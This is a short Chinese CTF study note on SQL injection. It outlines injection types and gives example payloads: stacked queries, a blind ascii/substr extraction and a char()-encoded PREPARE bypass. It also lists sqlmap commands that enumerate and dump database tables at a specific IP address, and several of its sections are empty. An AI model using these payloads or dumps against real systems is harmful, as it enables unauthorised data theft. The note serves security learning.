---
title: CTF中的SQL Injection知识点
date: 2022-12-31 14:25:39
keywords: ctf, sql injection
description: 本文总结了一些CTF中SQL注入的知识点。
---

数据库注入针对 Mysql、Oracle、Access、MSSql 都有不同的场景，比较常见的还是 Mysql 。

## 注入原理



## 基本类型

判断是整型注入还是字符型注入。

注入的基本类型

* 盲注，是在服务端没有错误回显的情况下注入
  * 布尔盲注
  * 时间盲注

* 显错注入
  * 联合注入，主要使用 union 关键字
  * 堆叠注入

* 报错注入

### 堆叠注入

堆叠注入就是多条语句一起执行，在 SQL 语法中，使用 `;` 分割多条语句，发现注入点后，通过构造多条语句同时执行。

```sql
GET /sqli/?id=1' ; select * from tables;
```

## 注入绕过



and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=‘security’ limit 0,1),1,1))<106%23




## Mysql 预处理

```sql
1';SET@sql=concat(char(115,101,108,101,99,116)," * from `1919810931114514`");PREPARE sqla from @sql;EXECUTE sqla;#
```

## Sqlmap

```sh
# 探测是否有漏洞
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 --level 2 --time-sec=10
# 查看当前数据库
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 --current-db
# 查看数据库表
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber --tables
# 查看表内容
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber -T cyber --dump

# 利用 POST 参数进行探测, search 为参数
$ sqlmap -u http://223.112.5.156:53583/ --data=search=1  --current-db
```

Sqlmap 的 tamper 脚本提供了一些绕过注入的方法。

Sqlmap 也支持盲注，通过添加 `--technique B` 参数可以对盲注场景进行注入。 

## 工具

* sqlmap



## 参考资料

1. [Sqlmap 命令大全](https://blog.csdn.net/phpppppppppp/article/details/124968358)
2. [Sqlmap 使用详解](https://blog.csdn.net/qq_43531669/article/details/113835025)
3. [SQL注入](https://www.cnblogs.com/yo1o/p/16079907.html)
4. [](https://www.freesion.com/article/43631100690/)
5. [盲注](https://blog.csdn.net/weixin_45634365/article/details/114190376)
